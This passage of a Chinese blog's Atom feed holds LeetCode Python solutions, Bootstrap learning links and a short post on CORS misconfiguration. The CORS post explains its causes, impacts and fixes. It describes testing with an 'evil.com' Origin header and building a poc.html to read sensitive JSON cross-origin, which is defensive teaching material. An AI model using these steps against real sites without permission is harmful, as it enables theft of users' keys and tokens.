class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：nums = [1,2,3,4]</span><br><span class="line">输出：[1,3,6,10]</span><br><span class="line">解释：动态和计算过程为 [1, 1+2, 1+2+3, 1+2+3+4] 。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：nums = [1,1,1,1,1]</span><br><span class="line">输出：[1,2,3,4,5]</span><br><span class="line">解释：动态和计算过程为 [1, 1+1, 1+1+1, 1+1+1+1, 1+1+1+1+1] 。</span><br><span class="line">示例 3：</span><br><span class="line"></span><br><span class="line">输入：nums = [3,1,2,10,1]</span><br><span class="line">输出：[3,4,6,16,17]</span><br><span class="line">class Solution:</span><br><span class="line">    def runningSum(self, nums: List[int]) -&gt; List[int]:</span><br><span class="line">        if not nums:</span><br><span class="line">            return []</span><br><span class="line">        for i in range(1,len(nums)):</span><br><span class="line">            nums[i]=nums[i]+nums[i-1]</span><br><span class="line">        return nums</span><br></pre></td></tr></table></figure><h3 id="寻找数组的中心索引"><a href="#寻找数组的中心索引" class="headerlink" title="寻找数组的中心索引"></a>寻找数组的中心索引</h3><ul><li><a href="https://leetcode-cn.com/problems/find-pivot-index/">寻找数组的中心索引</a></li></ul><p>解题思路：先求出所有数的总和，然后遍历数组，如果遍历数的左边*2 + 遍历数 &#x3D;&#x3D; 总和 ， 那这个数就一定是中心索引。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def pivotIndex(self, nums: List[int]) -&gt; int:</span><br><span class="line">        S=sum(nums)</span><br><span class="line">        leftnums=0</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            if leftnums *2  +  nums[i] == S:</span><br><span class="line">                return i</span><br><span class="line">            else:</span><br><span class="line">                leftnums += nums[i]</span><br><span class="line">        else:</span><br><span class="line">            return -1</span><br></pre></td></tr></table></figure><p><code>sum()</code> 方法对序列进行求和计算</p><p>Reference: <a href="https://www.pythonheidong.com/blog/article/249069/53202e9ddbc9740732b4/">https://www.pythonheidong.com/blog/article/249069/53202e9ddbc9740732b4/</a></p><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><ul><li><a href="https://leetcode-cn.com/problems/two-sum/">两数之和</a></li></ul><p>方法一：使用最容易理解的遍历数组进行查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def solution(nums,target):</span><br><span class="line">#如果列表长度小于2，则直接结束</span><br><span class="line">if len(nums) &lt; 2:</span><br><span class="line">            return</span><br><span class="line">        #两次循环列表，分别对列表中的所有可能的数字进行相加</span><br><span class="line">        #循环两次列表对应的时间复杂度为O(n²)</span><br><span class="line">        for i in range(0, len(nums) - 1):</span><br><span class="line">            for j in range(i+1, len(nums)):</span><br><span class="line">                if nums[i] + nums[j] == target:</span><br><span class="line">                    return [i, j]</span><br></pre></td></tr></table></figure><p>方法二：使用哈希表，通过以空间换取速度的方式，可以将查找时间从 O(n)降低到 O(1)。在python中列表字典的即为哈希类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def solution(nums,target):</span><br><span class="line">#新建立一个空字典用来保存数值及其在列表中对应的索引</span><br><span class="line">dict1 = &#123;&#125;</span><br><span class="line">#遍历一遍列表对应的时间复杂度为O(n)</span><br><span class="line">        for i in range(0, len(nums)):</span><br><span class="line">            #相减得到另一个数值</span><br><span class="line">            num = target - nums[i]</span><br><span class="line">            #如果另一个数值不在字典中，则将第一个数值及其的索引报错在字典中</span><br><span class="line">            #因为在字典中查找的时间复杂度为O(1)，因此总时间复杂度为O(n)</span><br><span class="line">            if num not in dict1:</span><br><span class="line">                dict1[nums[i]] = i</span><br><span class="line">            #如果在字典中则返回</span><br><span class="line">            else:</span><br><span class="line">                return [dict1[num], i]</span><br></pre></td></tr></table></figure><h3 id="整数反转"><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h3><ul><li><a href="https://leetcode-cn.com/problems/reverse-integer/">整数反转</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def reverse(self, x: int) -&gt; int:</span><br><span class="line">        if x == 0:</span><br><span class="line">            return 0</span><br><span class="line">        if x &gt; 0:</span><br><span class="line">            x = str(x)</span><br><span class="line">            x = x[::-1]</span><br><span class="line">        else:</span><br><span class="line">            x = str(x)</span><br><span class="line">            x = x[1:]    #为了删除负号</span><br><span class="line">            x = x[::-1]</span><br><span class="line">            x = &#x27;-&#x27; + x</span><br><span class="line">        x = int(x)</span><br><span class="line">        if -2**31 &lt; x &lt; 2**31-1:    #为了不超出32位整数</span><br><span class="line">            return x</span><br><span class="line">        else:</span><br><span class="line">            return 0</span><br></pre></td></tr></table></figure><p>利用R &#x3D; X[::-1]这种方法对X（X必须是字符串）进行一个反转复制的操作<br>[python 中的<a href="https://www.cnblogs.com/mxh1099/p/5804064.html">::-1]</a><br><a href="https://www.cnblogs.com/malinqing/p/11272485.html">彻底搞懂切片操作</a></p><h3 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h3><ul><li><a href="https://leetcode-cn.com/problems/palindrome-number/">回文数</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def isPalindrome(self, x: int) -&gt; bool:</span><br><span class="line">            if x&lt;0:</span><br><span class="line">                return False</span><br><span class="line">            x=str(x)</span><br><span class="line">            y=x[::-1]</span><br><span class="line">            if x==y:</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                return False</span><br></pre></td></tr></table></figure><h3 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h3><ul><li><a href="https://leetcode-cn.com/problems/roman-to-integer/">罗马数字转整数</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def romanToInt(self, s: str) -&gt; int:</span><br><span class="line">        d = &#123;&#x27;I&#x27;: 1, &#x27;IV&#x27;: 4, &#x27;V&#x27;: 5, &#x27;IX&#x27;: 9, &#x27;X&#x27;: 10, &#x27;XL&#x27;: 40, &#x27;L&#x27;: 50, &#x27;XC&#x27;: 90,  &#x27;C&#x27;: 100, &#x27;CD&#x27;: 400, &#x27;D&#x27;: 500, &#x27;CM&#x27;: 900, &#x27;M&#x27;: 1000&#125;</span><br><span class="line">        result = 0</span><br><span class="line">        i = 0</span><br><span class="line">        while i &lt; len(s):</span><br><span class="line">            #查看当前位和下一位的字符</span><br><span class="line">            str1 = s[i:i+2]</span><br><span class="line">            #如果当前位置是特殊情况，那么返回其在字典中对应值，并且下一次从特殊字符之后一位开始索引</span><br><span class="line">            if str1 in d:</span><br><span class="line">                result += d.get(str1)</span><br><span class="line">                i += 2</span><br><span class="line">            #如果当前位不是特殊情况，那么只返回当前位的数值</span><br><span class="line">            else:</span><br><span class="line">                result += d[s[i]]</span><br><span class="line">                i += 1</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure><h3 id="最长公共前缀"><a href="#最长公共前缀" class="headerlink" title="最长公共前缀"></a>最长公共前缀</h3><ul><li><a href="https://leetcode-cn.com/problems/longest-common-prefix/">最长公共前缀</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def longestCommonPrefix(self, strs):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type strs: List[str]</span><br><span class="line">        :rtype: str</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if not strs:                                        #边界条件判断，若字符串为空，则返回空</span><br><span class="line">            return &quot;&quot;</span><br><span class="line">        short_word=min(strs,key=len)                        #筛选出长度最短的单词然后进行遍历</span><br><span class="line">        for i,e in enumerate(short_word):                   #遍历长度最短的单词</span><br><span class="line">            for others in strs:                             #遍历列表中的其他字符串</span><br><span class="line">                if others[i]!=e:                            #一旦出现非公共字符，返回公共字符</span><br><span class="line">                    return short_word[:i]</span><br><span class="line">        return short_word                                   #遍历结束后依然没匹配到非公共字符，则返回整个字符</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python/python-func-enumerate.html">enumerate</a><br><code>enumerate()</code> 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%80%E7%BB%84%E6%95%B0%E6%95%B0%E7%BB%84%E7%9A%84%E5%8A%A8%E6%80%81%E5%92%8C&quot;&gt;一组数数组的动态和&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;</summary>
      
    
    
    
    
    <category term="learn" scheme="https://yinwc.github.io/tags/learn/"/>
    
  </entry>
  
  <entry>
    <title>深入理解CORS漏洞</title>
    <link href="https://yinwc.github.io/2020/11/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3CORS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yinwc.github.io/2020/11/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3CORS%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-11-20T08:50:04.000Z</published>
    <updated>2023-01-28T09:55:33.170Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li><li><a href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95">测试方法</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">修复建议</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>CORS，即跨源资源共享（Cross-Origin Resource Sharing）。同源策略（Same OriginPolicy）要求不同源之间是无法通信的，而CORS则是放宽同源策略以通过浏览器实现网站之间通信的机制。</li><li>CORS全称为Cross-Origin Resource Sharing即跨域资源共享，用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。<br>CORS漏洞则是利用CORS技术窃取用户敏感数据，CORS漏洞的成因是服务端配置的规则不当所导致的，服务器端没有配置Access-Control-Allow-Origin等字段</li></ul><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>1、获取用户数据<br>2、客户端缓存中毒：这种配置允许攻击者利用其他的漏洞，更改没有验证的字段，看是否正常回显。比如，一个应用返回数据报文头部中包含“X-User”这个字段，这个字段的值没有经过验证就直接输出到返回页面上，此时就可以结合XSS漏洞来利用。<br>3、服务端缓存中毒：利用CORS的错误配置注入HTTP头部，这可能会被服务器端缓存下来，比如制造存储型xss</p><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul><li>查看是否存在get请求的json形式敏感信息，在请求头中添加任意Origin值，如<a href="https://evil.xn--com%2C:access-control-allow-origin:https-p059do49bba822wts1ktzpa9z4nfj5jea//evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。">https://evil.com，查看返回头是否返回：Access-Control-Allow-Origin:https://evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。</a></li><li>CORS配置不当通常会导致的危害是用户敏感信息泄露，场景大多数是get请求方式返回的json形式的敏感信息（密钥、token，key等）。CORS配置不当属于响应头中的一种，其他还有X-Frame-Options、Content-Security-Policy等。漏洞利用成功的前提是，两个返回头必须为：Access-Control-Allow-Origin:<a href="https://evil.com/">https://evil.com</a><br>更改响应头Access-Control-Allow-Origin或Origin字段等，看返回头是否返回CORS配置字段</li></ul><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1、仔细评估是否开启CORS，如果不必要就不要开启CORS。<br>2、如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。<br>3、仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS。<br>4、要尽可能的返回”Vary: Origin”这个头部，以避免攻击者利用浏览器缓存。<br>5、如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。<br>6、限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。<br>7、限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。<br>8、仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://cloud.tencent.com/developer/article/1516490">CORS配置不当—挖掘技巧及实战案例全汇总</a><br><a href="https://xz.aliyun.com/t/2745">cors安全完全指南</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3&quot;&gt;漏洞危</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>前端框架之Bootstrap学习</title>
    <link href="https://yinwc.github.io/2020/10/13/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E4%B9%8BBootstrap%E5%AD%A6%E4%B9%A0/"/>
    <id>https://yinwc.github.io/2020/10/13/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E4%B9%8BBootstrap%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-13T08:43:02.000Z</published>
    <updated>2023-01-28T08:49:22.068Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%8E%92%E7%89%88">排版</a><ul><li><a href="#bootstrap%E6%A6%82%E8%BF%B0">Bootstrap概述</a><ul><li><a href="#%E7%89%B9%E6%80%A7">特性</a></li><li><a href="#%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6">包含文件</a></li></ul></li><li><a href="#bootstrap%E6%8E%92%E7%89%88html%E5%85%83%E7%B4%A0%E7%9A%84%E6%A0%B7%E5%BC%8F%E9%87%8D%E5%AE%9A%E4%B9%89">Bootstrap排版——HTML元素的样式重定义</a></li><li><a href="#bootstrap%E8%A1%A8%E6%A0%BC">Bootstrap表格</a></li><li><a href="#bootstrap%E8%A1%A8%E5%8D%95">Bootstrap表单</a></li><li><a href="#bootstrap%E5%9B%BE%E5%83%8F">Bootstrap图像</a></li><li><a href="#bootstrap%E6%A0%85%E6%A0%BC%E7%B3%BB%E7%BB%9F">Bootstrap栅格系统</a></li><li><a href="#bootstrap%E8%BE%85%E5%8A%A9%E7%B1%BB">Bootstrap辅助类</a></li></ul></li><li><a href="#%E7%BB%84%E4%BB%B6">组件</a><ul><li><a href="#bootstrap%E5%9B%BE%E6%A0%87">Bootstrap图标</a></li></ul></li><li><a href="#js%E6%8F%92%E4%BB%B6">js插件</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><p><a href="https://www.jianshu.com/p/32f0761261b7">标签 name&#x3D;”viewport” 详解</a></p><h1 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h1><h2 id="Bootstrap概述"><a href="#Bootstrap概述" class="headerlink" title="Bootstrap概述"></a><a href="https://www.cnblogs.com/xiaohuochai/p/7052394.html">Bootstrap概述</a></h2><p>　　在前端世界，有个叫Bootstrap的家伙，，是twitter 开源出来的一套前端框架，利用Ta可以快速开发网站界面，它的特点就是比自己从头写简单，直观，方便，快捷，省劲。</p><p>　　凡是使用过Bootstrap的开发者，都不在乎做这么两件事情：复制and粘贴。哈哈~，是的使用Bootstrap非常简单，但是在复制粘贴之前，需要先对Bootstrap的用法一一熟悉之后我们才开始干活！</p><p>　　Bootstrap，来自 Twitter，是目前最受欢迎的前端框架。Bootstrap是基于HTML，CSS，JavaScript的前端框架，它简洁灵活，使得Web开发更加快捷。它由Twitter的设计师Mark Otto 和 Jacob Thornton 合作开发，是一个CSS &#x2F; HTML 框架。Bootstrap提供了优雅的 HTML 和CSS规范，它是由动态的CSS语言Less写成的。</p><p> <strong>它用于开发响应式布局、移动设备优先的 WEB 项目。</strong></p><p>　我们去bootcdn （<a href="https://www.bootcdn.cn/">https://www.bootcdn.cn/</a> ）。会发现Bootstrap是星最多的前端框架之一。</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>响应式设计</li><li>栅格布局</li><li>完整的类库</li><li>jQuery插件</li><li>不同的使用场景</li></ul><h3 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h3><p> Bootstrap 提供了两种形式的压缩包，在下载下来的压缩包内可以看到以下目录和文件，这些文件按照类别放到了不同的目录内，并且提供了压缩与未压缩两种版本。</p><ul><li>【预编译版】</li></ul><p>　　下载压缩包之后，将其解压缩到任意目录即可看到以下（压缩版的）目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bootstrap/</span><br><span class="line">├── css/</span><br><span class="line">│   ├── bootstrap.css</span><br><span class="line">│   ├── bootstrap.css.map</span><br><span class="line">│   ├── bootstrap.min.css</span><br><span class="line">│   ├── bootstrap.min.css.map</span><br><span class="line">│   ├── bootstrap-theme.css</span><br><span class="line">│   ├── bootstrap-theme.css.map</span><br><span class="line">│   ├── bootstrap-theme.min.css</span><br><span class="line">│   └── bootstrap-theme.min.css.map</span><br><span class="line">├── js/</span><br><span class="line">│   ├── bootstrap.js</span><br><span class="line">│   └── bootstrap.min.js</span><br><span class="line">└── fonts/</span><br><span class="line">    ├── glyphicons-halflings-regular.eot</span><br><span class="line">    ├── glyphicons-halflings-regular.svg</span><br><span class="line">    ├── glyphicons-halflings-regular.ttf</span><br><span class="line">    ├── glyphicons-halflings-regular.woff</span><br><span class="line">    └── glyphicons-halflings-regular.woff2</span><br></pre></td></tr></table></figure><p> 上面展示的就是 Bootstrap 的基本文件结构：预编译文件可以直接使用到任何 web 项目中。提供了编译好的 CSS 和 JS (<code>bootstrap.*</code>) 文件，还有经过压缩的 CSS 和 JS (<code>bootstrap.min.*</code>) 文件。同时还提供了 CSS <a href="https://developer.chrome.com/devtools/docs/css-preprocessors">源码映射表</a> (<code>bootstrap.*.map</code>) ，可以在某些浏览器的开发工具中使用。同时还包含了来自 Glyphicons 的图标字体，在附带的 Bootstrap 主题中使用到了这些图标。</p><h2 id="Bootstrap排版——HTML元素的样式重定义"><a href="#Bootstrap排版——HTML元素的样式重定义" class="headerlink" title="Bootstrap排版——HTML元素的样式重定义"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7052397.html">Bootstrap排版——HTML元素的样式重定义</a></h2><h2 id="Bootstrap表格"><a href="#Bootstrap表格" class="headerlink" title="Bootstrap表格"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7068080.html">Bootstrap表格</a></h2><h2 id="Bootstrap表单"><a href="#Bootstrap表单" class="headerlink" title="Bootstrap表单"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7068087.html">Bootstrap表单</a></h2><h2 id="Bootstrap图像"><a href="#Bootstrap图像" class="headerlink" title="Bootstrap图像"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7101315.html">Bootstrap图像</a></h2><h2 id="Bootstrap栅格系统"><a href="#Bootstrap栅格系统" class="headerlink" title="Bootstrap栅格系统"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7101637.html">Bootstrap栅格系统</a></h2><h2 id="Bootstrap辅助类"><a href="#Bootstrap辅助类" class="headerlink" title="Bootstrap辅助类"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7074864.html">Bootstrap辅助类</a></h2><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h2 id="Bootstrap图标"><a href="#Bootstrap图标" class="headerlink" title="Bootstrap图标"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7101618.html">Bootstrap图标</a></h2><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7106649.html">Bootstrap下拉菜单</a></p><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7107129.html">Bootstrap按钮组</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7109350.html">Bootstrap按钮式下拉菜单</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7110728.html">Bootstrap输入框组</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7111581.html">Bootstrap导航</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7112631.html">Bootstrap导航条</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7113583.html">Bootstrap分页</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7113645.html">Bootstrap提示信息(标签、徽章、巨幕和页头)</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7119963.html">Bootstrap缩略图</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7120087.html">Bootstrap警告框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7122236.html">Bootstrap进度条</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7122564.html">Bootstrap媒体对象</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7123212.html">Bootstrap列表组</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7123548.html">Bootstrap面板</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7123822.html">Bootstrap洼地</a></p><h1 id="js插件"><a href="#js插件" class="headerlink" title="js插件"></a>js插件</h1><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7128599.html">Bootstrap插件概述</a></p><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7130390.html">Bootstrap模态弹出框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7136678.html">Bootstrap滚动监控器</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7144028.html">Bootstrap选项卡</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7147288.html">Bootstrap提示框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7153121.html">Bootstrap弹出框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7154682.html">Bootstrap按钮插件</a> </p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7155093.html">Bootstrap手风琴效果</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7156038.html">Bootstrap图片轮播</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7156551.html">Bootstrap自动定位浮标</a></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.cnblogs.com/xiaohuochai/p/7097376.html">Bootstrap学习记录</a></p><p><a href="https://www.cnblogs.com/wj-1314/p/9551426.html">https://www.cnblogs.com/wj-1314/p/9551426.html</a></p><p>补充：</p><p>前端框架layui</p><ul><li>安装<br>官方网址：<a href="http://www.layui.com/">http://www.layui.com/</a></li></ul><p>GIT：<a href="https://github.com/sentsin/layui/">https://github.com/sentsin/layui/</a></p><ul><li>官网下载后，会有一个压缩包<br>layui.all.js 包含了所有模块的js 速度慢<br>layui.js 速度快 使用时需要倒入</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%8E%92%E7%89%88&quot;&gt;排版&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#bootstrap%E6%A6%82%E8%BF%B0&quot;&gt;Bootstrap概述&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="安全开发" scheme="https://yinwc.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
</feed>
